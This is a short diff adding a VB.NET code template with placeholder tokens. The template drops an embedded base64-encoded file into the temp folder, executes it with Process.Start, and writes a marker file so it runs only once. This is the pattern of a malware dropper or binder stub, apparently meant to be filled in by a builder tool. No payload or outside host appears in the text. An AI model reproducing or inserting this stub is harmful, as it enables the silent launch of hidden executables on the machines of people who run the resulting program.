@@ -1,0 +1,8 @@
+If Not IO.File.Exists(IO.Path.GetTempPath & "%1%.txt") Then
+Dim %2% As String = %3% 
+IO.File.Delete(IO.Path.GetTempPath & "%4%")
+IO.File.WriteAllBytes(IO.Path.GetTempPath & "%4%", Convert.FromBase64String(%2%))
+Process.Start(IO.Path.GetTempPath & "%4%")
+IO.File.WriteAllText(IO.Path.GetTempPath & "%1%.txt", "%5%")
+Else
+End if
